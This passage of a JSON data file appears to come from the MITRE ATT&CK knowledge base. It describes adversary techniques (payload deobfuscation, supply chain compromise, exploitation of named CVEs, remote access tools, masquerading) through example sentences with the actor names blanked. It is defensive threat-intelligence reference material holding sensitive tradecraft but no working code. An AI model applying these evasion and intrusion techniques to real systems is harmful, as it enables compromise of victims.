      "was decoded using a custom rolling XOR algorithm to execute a customized  payload.",
      "has used  to decode base64-encoded assembly.",
      "uses a unique custom de-obfuscation technique.",
      "has used weaponized DLLs to load and decrypt payloads.",
      "can use an XOR key to decrypt a PowerShell loader and payload binary.",
      "decodes many of its artifacts and is decrypted (AES-128) after being downloaded.",
      "can deobfuscate downloaded files stored in reverse byte order and decrypt embedded resources using multiple XOR operations.",
      "has extracted tar.gz files after downloading them from a C2 server.",
      "can use a decryption algorithm for strings based on Rotate on Right (RoR) and Rotate on Left (RoL) functionality.",
      "can decrypt PowerShell scripts for execution.",
      "can decode and decrypt data received from C2.",
      "has the ability to decrypt an embedded .NET module.",
      "has used a polymorphic decryptor to decrypt itself at runtime.",
      "custom cryptor CryptOne used an XOR based algorithm to decrypt the payload.",
      "decompresses and decrypts itself using the Microsoft API call RtlDecompressBuffer.",
      "decodes configuration items from a bundled file for command and control activity.",
      "can decode decrypt and decompress multiple layers of shellcode.",
      "can use a VBA macro to decode its payload prior to installation and execution.",
      "can decrypt received data from its C2 server by using AES.",
      "can decode shellcode using a custom rotating XOR cipher.",
      "can decrypt command parameters sent through C2 and use unpacking code to extract its packed executable.",
      "can decrypt password-protected executables.",
      "extracts and decrypts stage 3 malware which is stored in encrypted resources.",
      "used shellcode with an XOR algorithm to decrypt a payload.  also decrypted image files which contained a payload.",
      "has utilized `certutil` to decode base64 encoded versions of custom malware.",
      "has decoded antivirus name strings.",
      "can URL decode key/value pairs sent over C2.",
      "During  the threat actors deobfuscated Base64-encoded commands following the execution of a malicious script which revealed a small script designed to obtain an additional payload.",
      "uses XOR and RC4 to perform decryption on the code functions.",
      "The  dropper can decrypt and decompresses a data blob.",
      "can decrypt downloaded payloads.  also resolves strings and other artifacts at runtime.",
      "has used LZMA and base64 libraries to decode obfuscated scripts.",
      "VBS backdoor can decode Base64-encoded data and save it to the %TEMP% folder. The group also decrypted received information using the Triple DES algorithm and decompresses it using GZip.",
      "can use base64 and AES ECB decryption prior to execution of downloaded modules.",
      "can use a custom decryption algorithm to decrypt strings.",
      "During  attackers used VBS code to decode payloads.",
      "decodes its secondary payload and writes it to the victims machine.  also uses AES and XOR to decrypt strings and payloads.",
      "has the ability to deobfuscate downloaded files prior to execution.",
      "decrypts strings in the code during the execution process.",
      "can deobfuscate base64 encoded and AES encrypted commands.",
      "has used a custom routine to decrypt strings.",
      "can decrypt and parse instructions sent from C2.",
      "has used AES and XOR to decrypt its DLLs.",
      "can decompress data received within `POST` requests.",
      "has decrypted an AES encrypted binary file to trigger the download of other files.",
      "has decoded its PowerShell script.",
      "can decode and decrypt exfiltrated data sent to C2.",
      "can extract its agent from the body of a malicious document.",
      "has decoded strings from the C2 server before executing commands.",
      "Upon execution  has unzipped itself after being downloaded to the system and has performed string decryption.",
      "can Base64 decode and RC4 decrypt malicious payloads sent through a web requests command parameter.",
      "can decrypt encrypted strings and write them to a newly created folder.",
      "has the ability to use bytecode to decrypt embedded payloads.",
      "decodes an embedded executable using base64 and decompresses it.",
      "decrypts code to connect to a remote C2 server.",
      "has used a XOR key to decrypt strings.",
      "During  malicious files were decoded prior to execution.",
      "has the ability to decrypt fileless loader modules.",
      "used certutil to decode Base64 binaries at runtime and a 16-byte XOR key to decrypt data.",
      "can decrypt AES encrypted C2 communications.",
      "has a function that decrypts malicious data.",
      "can use a custom algorithm to decrypt strings used by the malware.",
      "decrypted its  payload using an AES-256 encryption algorithm in CBC mode with a unique key per sample.",
      "has used a decryption routine that is part of an executable physical patch.",
      "has decoded Base64 encoded URLs to insert a recipients name into the filename of the Word document.  has also extracted executables from ZIP files.",
      "delivered payloads using multiple rounds of obfuscation and encoding to evade defenses and analysis.",
      "has deployed base64-encoded variants of  to evade detection.",
      "can decrypt strings to retrieve configuration settings.",
      "has the ability to deobfuscate encrypted strings.",
      "can use an embedded RC4 key to decrypt Windows API function strings.",
      "can decrypt strings related to communication configuration using RC4 with a static key.",
      "strings are deobfuscated prior to execution.",
      "deobfuscates embedded payloads.",
      "can decrypt embedded scripts prior to execution.",
      "can deobfuscate files containing the next stages in the infection chain.",
      "has the ability to decode and decrypt malicious payloads prior to execution.",
      "can run `CryptStringToBinaryA` to decrypt base64 content containing its ransom note.",
      "tools decrypted additional payloads from the C2.  has also decoded base64-encoded source code of a downloader. Additionally  has decoded Telegram content to reveal the IP address for C2 communications.",
      "decodes and decrypts embedded payloads.",
      "delivered exploit payloads via base64-encoded payloads in malicious email messages.",
      "XORs some strings within the binary using the value 0xD5 and deobfuscates these items at runtime.",
      "decrypts command and control URIs using ADVobfuscator and decrypts IP addresses and port numbers with a custom algorithm. Other versions of  decode chunks of stored stage 2 payload content in the initial payload .text section before consolidating them for further execution. Overall  is associated with multiple encoding and encryption mechanisms to obfuscate the malware's presence and avoid analysis or detection.",
      "used highly obfuscated JavaScript files as one initial installer for .",
      "contains several layers of obfuscation to hide malicious code from detection and analysis.",
      "uses RC4-encrypted base64-encoded strings to obfuscate functionality and command and control servers.",
      "Upon execution  can decode an embedded .pdf and write it to the desktop as a decoy document.",
      "compiled code is obfuscated in an unspecified fashion prior to delivery to victims.",
      "stores network configuration data in a file XOR encoded with the key value of `0x7A`.",
      "During   used a script to concatenate and deobfuscate encoded strings in .",
      "The  payload is decrypted at runtime.",
      "encodes its main content prior to loading via Python as base64-encoded blobs.",
      "shellcode payloads are base64 encoded when transmitted to compromised devices.",
      "has used Base64-encoded content during execution decoded via PowerShell.",
      "has used the RC4 algorithm to decrypt configuration data.",
      "has distributed password-protected archives such as ZIP files during intrusions.",
      "decodes and decrypts data stored in the configuration file with a key provided on the command line during execution.",
      "can decode and decrypt command line strings and files received through C2.",
      "can use a provided passphrase to decrypt its configuration file.",
      "During   unarchived data using the GUI version of WinRAR.",
      "can decode scripts and strings in loaded modules.",
      "uses a custom decryption routine to unpack itself during installation.",
      "utilizes obfuscated JSON structures for various data storage and configuration management items.",
      "has encoded commands in base64-encoded sections concatenated together in PowerShell.  uses PowerShell commands to disable Windows Defender.",
      "uses XOR and RC4 algorithms to decrypt payloads and functions.  can be distributed as a self-extracting RAR archive that launches an AutoIT loader.",
      "stores command and control URLs using base64 encoding in the malware's configuration file.",
      "can decode and decrypt C2 commands received via email.",
      "payloads have included strings encrypted via XOR.  JavaScript payloads utilize Base64-encoded payloads that are decoded via  to create a malicious DLL file.",
      "is distributed as an obfuscated JavaScript launcher file.",
      "can deobfuscate loaded modules prior to execution.",
      "can Base64-decode and XOR decrypt received C2 commands.",
      "can Base64-decode and XOR-decrypt C2 commands taken from JSON files.",
      "involved the use of Base64 obfuscated scripts and commands.",
      "has used Base64-encoded data to transfer payloads and commands including deobfuscation via ."
    ],
    "id": "T1140",
    "name": "Deobfuscate/Decode Files or Information",
    "similar_words": [
      "Deobfuscate/Decode Files or Information"
    ]
  },
  "attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7": {
    "description": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.Supply chain compromise can take place at any stage of the supply chain including:* Manipulation of development tools* Manipulation of a development environment* Manipulation of source code repositories (public or private)* Manipulation of source code in open-source dependencies* Manipulation of software update/distribution mechanisms* Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) * Replacement of legitimate software with modified versions* Sales of modified/counterfeit products to legitimate distributors* Shipment interdictionWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)",
    "example_uses": [
      "was added to a legitimate, signed version 5.33 of the CCleaner software and distributed on CCleaner's distribution site.",
      "has targeted manufacturers in the supply chain for the defense industry.",
      "was distributed through a compromised update to a Tor client with a coin miner payload.",
      "has been distributed through cracked software downloads.",
      "has compromised information technology providers and software developers providing services to targets of interest building initial access to ultimate victims at least in part through compromise of service providers that work with the victim organizations.",
      "staged compromised versions of legitimate software installers on forums to achieve initial untargetetd access in victim environments.",
      "has been delivered through cracked software downloads.",
      "has leveraged compromised organizations to conduct supply chain attacks on government entities."
    ],
    "id": "T1195",
    "name": "Supply Chain Compromise",
    "similar_words": [
      "Supply Chain Compromise"
    ]
  },
  "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c": {
    "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.Exploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) On ESXi infrastructure, adversaries may exploit exposed OpenSLP services; they may alternatively exploit exposed VMware vCenter servers.(Citation: Recorded Future ESXiArgs Ransomware 2023)(Citation: Ars Technica VMWare Code Execution Vulnerability 2021) Depending on the flaw being exploited, this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).If an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005)), exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.Adversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
    "example_uses": [
      "has been observed using SQL injection to gain access to systems.",
      "is used to automate SQL injection.",
      "can be used to automate exploitation of SQL injection vulnerabilities.",
      "During   exploited CVE-2021-35464 in the ForgeRock Open Access Management (OpenAM) application server to gain initial access.",
      "exploited Apache Struts Oracle WebLogic (CVE-2017-10271) and Adobe ColdFusion (CVE-2017-3066) vulnerabilities to deliver malware.",
      "has exploited the Microsoft SharePoint vulnerability CVE-2019-0604 and CVE-2021-26855 CVE-2021-26857 CVE-2021-26858 and CVE-2021-27065 in Exchange Server.",
      "has compromised targeted organizations through exploitation of CVE-2021-31207 in Exchange.",
      "During  the threat actors exploited VMWare Horizon Unified Access Gateways that were vulnerable to several Log4Shell vulnerabilities including CVE-2021-44228 CVE-2021-45046 CVE-2021-45105 and CVE-2021-44832.",
      "is executed after the attacker gains initial access to a Windows container using a known vulnerability.",
      "gained initial access through exploitation of CVE-2021-40539 in internet-facing ManageEngine ADSelfService Plus servers.",
      "exploits public-facing applications for initial access and to acquire infrastructure such as exploitation of the EXIM mail transfer agent in Linux systems.",
      "has used a variety of public exploits including CVE 2020-0688 and CVE 2020-17144 to gain execution on vulnerable Microsoft Exchange; they have also conducted SQL injection attacks against external websites.",
      "has exploited various vulnerabilities for initial access including Microsoft Exchange vulnerability CVE-2020-0688.",
      "During  threat actors gained initial access by exploiting vulnerabilities in JBoss webservers.",
      "During  threat actors used SQL injection exploits against extranet web servers to gain access.",
      "During   exploited CVE-2021-44207 in the USAHerds application and CVE-2021-44228 in Log4j as well as other .NET deserialization SQL injection and directory traversal vulnerabilities to gain initial access.",
      "has exploited CVE-2020-5902 an F5 BIP-IP vulnerability to drop a Linux backdoor.  has also exploited mis-configured Plesk servers.",
      "has exploited Oracle WebLogic vulnerabilities for initial compromise.",
      "has exploited known vulnerabilities such as CVE-2017-1000486 (Primefaces Application Expression Language Injection) CVE-2015-7450 (WebSphere Application Server SOAP Deserialization Exploit) CVE-2010-5326 (SAP NewWeaver Invoker Servlet Exploit) and EDB-ID-24963 (SAP NetWeaver ConfigServlet Remote Code Execution) to gain initial access.",
      "has exploited a buffer overflow vulnerability in Microsoft Internet Information Services (IIS) 6.0 CVE-2017-7269 in order to establish a new HTTP or command and control (C2) server.",
      "has exploited the Log4j utility (CVE-2021-44228) on-premises MS Exchange servers via ProxyShell (CVE-2021-34473 CVE-2021-34523 CVE-2021-31207) and Fortios SSL VPNs (CVE-2018-13379).",
      "can gain access by exploiting a Sangfor SSL VPN vulnerability that allows for the placement and delivery of malicious update binaries.",
      "has been dropped through exploitation of CVE-2011-2462 CVE-2013-3163 and CVE-2014-0322.",
      "is installed following exploitation of a vulnerable FortiGate device.",
      "has exploited known vulnerabilities in Fortinet PulseSecure and Palo Alto VPN appliances.",
      "has exploited multiple unpatched vulnerabilities for initial access including vulnerabilities in Microsoft Exchange Manage Engine AdSelfService Plus Confluence and Log4j.",
      "has compromised networks by exploiting Internet-facing applications including vulnerable Microsoft Exchange and SharePoint servers.",
      "During  the threat actors exploited multiple vulnerabilities in externally facing servers.",
      "During the   exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.",
      "During  threat actors exploited CVE-2023-46805 and CVE-2024-21887 in Ivanti Connect Secure VPN appliances to enable authentication bypass and command injection. A server-side request forgery (SSRF) vulnerability CVE-2024-21893 was identified later and used to bypass mitigations for the initial two vulnerabilities by chaining with CVE-2024-21887.",
      "has leveraged vulnerabilities in Pulse Secure VPNs to hijack sessions.",
      "has exploited the ProxyLogon vulnerability (CVE-2021-26855) to compromise Exchange Servers at multiple organizations.",
      "has gained initial access by exploiting CVE-2019-18935 a vulnerability within Telerik UI for ASP.NET AJAX.",
      "exploited a publicly-facing servers including Wildfly/JBoss servers to gain access to the network.",
      "has compromised victims by directly exploiting vulnerabilities of public-facing servers including those associated with Microsoft Exchange and Oracle GlassFish.",
      "has exploited CVE-2019-19781 for Citrix CVE-2019-11510 for Pulse Secure VPNs CVE-2018-13379 for FortiGate VPNs and CVE-2019-9670 in Zimbra software to gain access.",
      "has targeted publicly facing web servers with both automatic and manual vulnerability discovery.",
      "has exploited known vulnerabilities in public-facing infrastructure such as Microsoft Exchange Servers.",
      "has conducted SQL injection attacks exploited vulnerabilities CVE-2019-19781 and CVE-2020-0688 for Citrix and MS Exchange and CVE-2018-13379 for Fortinet VPNs.",
      "exploited CVE-2020-10189 against Zoho ManageEngine Desktop Central through unsafe deserialization and CVE-2019-19781 to compromise Citrix Application Delivery Controllers (ADC) and gateway devices.  leveraged vulnerabilities such as ProxyLogon exploitation or SQL injection for initial access.",
      "has exploited CVE-2021-44228 in Log4j and CVE-2021-26855 CVE-2021-26857 CVE-2021-26858 and CVE-2021-27065 to compromise on-premises versions of Microsoft Exchange Server.",
      "has exploited vulnerabilities in externally facing software and devices including Pulse Secure VPNs and Citrix Application Delivery Controllers.",
      "has exploited the Microsoft Exchange memory corruption vulnerability (CVE-2020-0688).",
      "has used SQL injection for initial compromise.",
      "involved exploitation of a vulnerability in Versa Director servers since identified as CVE-2024-39717 for initial access and code execution.",
      "has gained initial access through exploitation of multiple vulnerabilities in internet-facing software and appliances such as Fortinet Ivanti (formerly Pulse Secure) NETGEAR Citrix and Cisco.",
      "gains initial access to victim environments by exploiting external-facing services. Examples include exploitation of CVE-2021-26084 in Confluence servers; CVE-2022-41040 ProxyShell and other vulnerabilities in Microsoft Exchange; and multiple vulnerabilities in open-source platforms such as content management systems.",
      "For  threat actors exploited CVE-2019-0604 in Microsoft SharePoint for initial access.",
      "exploits public-facing applications for initial access to victim environments. Examples include widespread attempts to exploit CVE-2018-13379 in FortiOS devices and SQL injection activity.",
      "has exploited known and zero-day vulnerabilities in software usch as Roundcube Webmail servers and the Follina vulnerability.",
      "has exploited known vulnerabilities including CVE-2023-3519 in Citrix NetScaler for initial access.",
      "exploited CVE-2020-10189 against Zoho ManageEngine Desktop Central through unsafe deserialization and CVE-2019-19781 to compromise Citrix Application Delivery Controllers (ADC) and gateway devices.  leveraged vulnerabilities such as ProxyLogon exploitation or SQL injection for initial access.  exploited CVE-2021-26855 against a vulnerable Microsoft Exchange Server to gain initial access to the victim network.",
      "has exploited known vulnerabilities for initial access including CVE-2018-13379 and CVE-2020-12812 in FortiOS and CVE-2022-41082 and CVE-2022-41040 (ProxyNotShell) in Microsoft Exchange.",
      "During  threat actors exploited CVE-2023-48022 on publicly exposed Ray servers to steal computing power and to expose sensitive data.",
      "exploited public-facing web applications and appliances for initial access during .",
      "During  threat actors exploited CVE-2024-3400 in Palo Alto Networks GlobalProtect.",
      "gained access to victim environments by exploiting multiple known vulnerabilities over several campaigns.",
      "exploited vulnerabilities such as ProxyLogon and ProxyShell for initial access to victim environments.",
      "has enabled the exploitation of CVE-2022-27518 and CVE-2022-27518 for illegitimate access.",
      "is associated with exploitation of CVE-2022-49475 in FortiOS.",
      "has exploited and infected vulnerable routers to recruit additional network devices into the ORB.",
      "abused WebVPN traffic to targeted devices to achieve unauthorized remote code execution.",
      "has used exploits against publicly-disclosed vulnerabilities for initial access into victim networks.",
      "was likely enabled by the adversary exploiting an unknown vulnerability in an external-facing router.",
      "has exploited multiple vulnerabilities to compromise edge devices and on-premises versions of Microsoft Exchange Server.",
      "has exploited CVE-2018-0171 in the Smart Install feature of Cisco IOS and Cisco IOS XE software for initial access."
    ],
    "id": "T1190",
    "name": "Exploit Public-Facing Application",
    "similar_words": [
      "Exploit Public-Facing Application"
    ]
  },
  "attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7": {
    "description": "An adversary may use legitimate remote access tools to establish an interactive command and control channel within a network. Remote access tools create a session between two trusted hosts through a graphical interface, a command line interaction, a protocol tunnel via development or management software, or hardware-level access such as KVM (Keyboard, Video, Mouse) over IP solutions. Desktop support software (usually graphical interface) and remote management software (typically command line interface) allow a user to control a computer remotely as if they are a local user inheriting the user or software permissions. This software is commonly used for troubleshooting, software installation, and system management.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy) Adversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.Remote access tools may be installed and used post-compromise as an alternate communications channel for redundant access or to establish an interactive remote desktop session with the target system. It may also be used as a malware component to establish a reverse connection or back-connect to a service or adversary-controlled system.Installation of many remote access tools may also include persistence (e.g., the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chromes Remote Desktop).(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop)",
    "example_uses": [
      "has a plugin for VNC and Ammyy Admin Tool.",
      "used the Ammyy Admin tool as well as TeamViewer for remote access.",
      "used a cloud-based remote access software called LogMeIn for their attacks.",
      "used legitimate programs such as AmmyAdmin and Team Viewer for remote interactive C2 to target systems.",
      "has established tmate sessions for C2 communications.",
      "contains a module for VNC.",
      "has the capability to download a VNC module from command and control (C2).",
      "has used the malware variant TerraTV to run a legitimate TeamViewer application to connect to compromrised machines.",
      "has installed TeamViewer on targeted systems.",
      "has utilized the remote management tool Atera to download malware to a compromised system.",
      "During  the threat actors used AnyDesk to transfer tools between systems.",
      "has used a modified TeamViewer client as a command and control channel.",
      "has used the cloud-based remote management and monitoring tool ConnectWise Control to deploy .",
      "has used a modified version of TeamViewer and Remote Utilities for remote access.",
      "During   directed victims to run remote monitoring and management (RMM) tools.In addition to directing victims to run remote software Scattered Spider members themselves also deploy RMM software including AnyDesk LogMeIn and ConnectWise Control to establish persistence on the compromised network.",
      "used DameWare Mini Remote Control for lateral movement.",
      "uses vncDll module to remote control the victim machine.",
      "During   directed victims to run remote monitoring and management (RMM) tools.",
      "has used remote administration tools or remote industrial control system client software for execution and to maliciously release electricity breakers.",
      "used legitimate programs such as AmmyyAdmin and Team Viewer for remote interactive C2 to target systems.",
      "During  the threat actors installed the AnyDesk remote desktop application onto the compromised network.",
      "During  threat actors used several remote administration tools as persistent infiltration channels.",
      "has checked for the LogMein event log in an attempt to encrypt files in remote machines.",
      "has used legitimate applications ScreenConnect and AteraAgent to manage systems remotely and move laterally.",
      "uses legitimate utilities such as AnyDesk and PuTTy for maintaining remote access to victim environments.",
      "used the Ammyy Admin tool as well as TeamViewer for remote access including to preserve remote access if a Cobalt Strike module was lost.",
      "has used AnyDesk and PuTTY on compromised systems.",
      "has used legitimate applications ScreenConnect AteraAgent and SimpleHelp to manage systems remotely and move laterally.",
      "has incorporated remote monitoring and management (RMM) tools into their operations including .",
      "has used tools such as AnyDesk in victim environments."
    ],
    "id": "T1219",
    "name": "Remote Access Tools",
    "similar_words": [
      "Remote Access Tools",
      "Remote Access Software"
    ]
  },
  "attack-pattern--428ca9f8-0e33-442a-be87-f869cb4cf73e": {
    "description": "An adversary performs C2 communications using multiple layers of encryption, typically (but not exclusively) tunneling a custom encryption scheme within a protocol encryption scheme such as HTTPS or SMTPS.",
    "example_uses": [
      "can use Obfs3, a pluggable transport, to add another layer of encryption and obfuscate TLS.",
      "encapsulates traffic in multiple layers of encryption.",
      "communicates using HTTPS and uses a custom encryption cipher to encrypt the HTTPS message body.",
      "encrypts C2 traffic with HTTPS and also encodes it with a single-byte XOR key."
    ],
    "id": "T1079",
    "name": "Multilayer Encryption",
    "similar_words": [
      "Multilayer Encryption"
    ]
  },
  "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0": {
    "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",
    "example_uses": [
      "installation file is an unsigned DMG image under the guise of Intego’s security solution for mac.",
      "variants have attempted to appear legitimate by using the file names SafeApp.exe and NeutralApp.exe, as well as by adding a new service named OfficeUpdateService.",
      "contains several references to football (including \"football,\" \"score,\" \"ball,\" and \"loose\") in a likely attempt to disguise its traffic.",
      "created accounts disguised as legitimate backup and service accounts as well as an email administration account.",
      "renames one of its .dll files to uxtheme.dll in an apparent attempt to masquerade as a legitimate file.",
      "saves one of its files as mpr.dll in the Windows folder, masquerading as a legitimate library file.",
      "has dropped binaries as files named microsoft_network.exe and crome.exe.",
      "uses file and folder names related to legitimate programs in order to blend in, such as HP, Intel, Adobe, and perflogs.",
      "establishes persistence by adding a new service with the display name \"WMI Performance Adapter Extension\" in an attempt to masquerade as a legitimate WMI service.",
      "used the PowerShell filenames Office365DCOMCheck.ps1 and SystemDiskClean.ps1.",
      "Some  variants add new services with display names generated by a list of hard-coded strings such as Application, Background, Security, and Windows, presumably as a way to masquerade as a legitimate service.",
      "adds a new service named NetAdapter in an apparent attempt to masquerade as a legitimate service.",
      "mimics filenames from %SYSTEM%\\System32 to hide DLLs in %WINDIR% and/or %TEMP%.",
      "has used filenames and Registry key names associated with Windows Defender.",
      "attempts to hide its payloads using legitimate filenames.",
      "has given malware the same name as an existing file on the file share server to cause users to unwittingly launch and install the malware on additional systems.",
      "The  dropper has masqueraded a copy of the infected system's rundll32.exe executable that was moved to the malware's install directory and renamed according to a predefined configuration file.",
      "To establish persistence,  adds a Registry Run key with a value \"TaskMgr\" in an attempt to masquerade as the legitimate Windows Task Manager.",
      "named its tools to masquerade as Windows or Adobe Reader software, such as by using the file name adobecms.exe and the directory CSIDL_APPDATA\\microsoft\\security.",
      "has masqueraded as legitimate Adobe Content Management System files.",
      "New services created by  are made to appear like legitimate Windows services, with names such as \"Windows Management Help Service\", \"Microsoft Support\", and \"Windows Advanced Task Manager\".",
      "has masqueraded as legitimate software update packages such as Adobe Acrobat Reader and Intel.",
      "copies itself to an .exe file with a filename that is likely intended to imitate Norton Antivirus but has several letters reversed (e.g. notron.exe).",
      "can create a new service named msamger (Microsoft Security Accounts Manager), which mimics the legitimate Microsoft database by the same name.",
      "installer contains a malicious file named navlu.dll to decrypt and run the RAT. navlu.dll is also the name of a legitimate Symantec DLL.",
      "mimics the resource version information of legitimate Realtek Semiconductor, Nvidia, or Synaptics modules.",
      "saves itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service.",
      "has created a scheduled task named “AdobeFlashSync” to establish persistence.",
      "If installing itself as a service fails,  instead writes itself as a file named svchost.exe saved in %APPDATA%\\Microsoft\\Network.",
      "In one instance,  added  as a service with a display name of \"Corel Writing Tools Utility.\"",
      "mimics a legitimate Russian program called USB Disk Security.",
      "has used hidden or non-printing characters to help masquerade file names on a system, such as appending a Unicode no-break space character to a legitimate service name.",
      "A  implant file was named ASPNET_FILTER.DLL, mimicking the legitimate ASP.NET ISAPI filter DLL with the same name.",
      "uses the filename owaauth.dll, which is a legitimate file that normally resides in %ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\Auth\\; the malicious file by the same name is saved in %ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\bin\\.",
      "installs itself in %ALLUSERPROFILE%\\\\Application Data\\Microsoft\\MediaPlayer\\updatewindws.exe; the directory name is missing a space and the file name is missing the letter \"o.\"",
      "The  loader implements itself with the name Security Support Provider, a legitimate Windows function. Various  .exe files mimic legitimate file names used by Microsoft, Symantec, Kaspersky, Hewlett-Packard, and VMWare.  also disguised malicious modules using similar filenames as custom network encryption software on victims.",
      "creates a new service named “ntssrv” that attempts to appear legitimate; the service's display name is “Microsoft Network Realtime Inspection Service” and its description is “Helps guard against time change attempts targeting known and newly discovered vulnerabilities in network time protocols.”",
      "To establish persistence,  identifies the Start Menu Startup directory and drops a link to its own executable disguised as an “Office Start,” “Yahoo Talk,” “MSN Gaming Z0ne,” or “MSN Talk” shortcut.",
      "may save itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service.",
      "saves itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service.",
      "installed its payload in the startup programs folder as \"Baidu Software Update.\" The group also adds its second stage payload to the startup programs as “Net Monitor.\"",
      "tools attempt to spoof anti-virus processes as a means of self-defense.",
      "actors used the following command to rename one of their tools to a benign file name: ren \"%temp%\\upload\" audiodg.exe",
      "malware names itself \"svchost.exe,\" which is the name of the Windows shared service host program.",
      "The file name AcroRD32.exe, a legitimate process name for Adobe's Acrobat Reader, was used by  as a name for malware.",
      "has used  to change file extensions to their true type that were masquerading as .txt files.",
      "has disguised a Cobalt Strike beacon as a Flash Installer.",
      "has attempted to mimic a compromised user's traffic by using the same user agent as the installed browser.",
      "was built to include a modified version of 7-Zip source code (including associated export names) and Far Manager source code.",
      "has masked executables with document file icons including Word and Adobe PDF.",
      "can disguise JavaScript files as PDFs.",
      "has used .doc file extensions to mask malicious executables.",
      "masqueraded malicious installers as Windows update packages to evade defense and entice users to execute binaries.",
      "has renamed malicious binaries as `wallpaper.mp4` and `slideshow.mp4` to avoid detection.",
      "attempted to make  appear as a Telegram Messenger with a Russian interface.",
      "builds a malicious application bundle to resemble Safari through using the Safari icon and Info.plist.",
      "payload has been renamed `PowerShellInfo.exe`.",
      "can masquerade the output of C2 commands as a fake but legitimately formatted WebP file.",
      "can download malicious files with a .tmp extension and append them with .exe prior to execution.",
      "has disguised a PowerShell script as a .dat file (goopdate.dat).",
      "has used an executable named `companycatalogue` to appear benign.",
      "has used icons mimicking MS Office files to mask payloads.",
      "has the ability to mask malicious data strings as PDF files.",
      "has disguised their scripts with docker-related file names.",
      "has used several different security software icons to disguise executables.",
      "has created accounts disguised as legitimate backup and service accounts as well as an email administration account.",
      "has renamed the WinRAR utility to avoid detection.",
      "has masqueraded as a JPG image file.",
      "has spoofed legitimate applications in phishing lures and changed file extensions to conceal installation of malware.",
      "has masqueraded staged data by using the Windows  utility to generate fake Base64 encoded certificates with the input file.",
      "The  downloader has used an icon to appear as a Microsoft Word document.",
      "drops  with the filename dllhost.dat.",
      "For  the threat actors disguised some executables as JPG files.",
      "has used icons mimicking MS Office files to mask malicious executables.  has also attempted to hide executables by changing the file extension to .scr to mimic Windows screensavers.",
      "has upon execution displayed a message box that appears to be related to a Ukrainian electronic document management system.",
      "has been disguised as a JPG extension to avoid detection as a malicious PE file.",
      "can create .dll files that actually contain a Rich Text File format document.",
      "has used an icon mimicking a text file to mask a malicious executable.",
      "has used a file named English.rtf to appear benign on victim hosts.",
      "The  Mach-O binary has been disguised as a .nib file.",
      "has used filenames that match the name of the compromised system in attempt to avoid detection.",
      "During   was disguised using the victim company name as the filename.",
      "has used folder icons for malicious files to lure victims into opening them.",
      "During  the threat actors named a binary file `compareForfor.jpg` to disguise it as a JPG file.",
      "has masked malware DLLs as dat and jpg files.",
      "has renamed rar.exe to avoid detection.",
      "can use a legitimate process name to hide itself.",
      "has been delivered as archived Windows executable files masquerading as PDF documents.",
      "can masquerade as pirated media content for initial delivery to victims.",
      "During  the threat actors modified the MaoCheng dropper so its icon appeared as a Word document.",
      "dropped a decoy payload with a .jpg extension that contained a malicious Visual Basic script.",
      "has renamed the legitimate Sysinternals tool procdump to alternative names such as dump64.exe to evade detection.",
      "used the Plink tool for tunneling and connections to remote machines renaming it systems.exe in some instances.",
      "involves changing process filename to pr_set_mm_exe_file and process name to pr_set_name during later infection stages.",
      "created specially-crafted documents mimicking legitimate government or similar documents during phishing campaigns.",
      "involved the use of digital certificates on adversary-controlled network infrastructure that mimicked the formatting used by legitimate Cisco ASA appliances.",
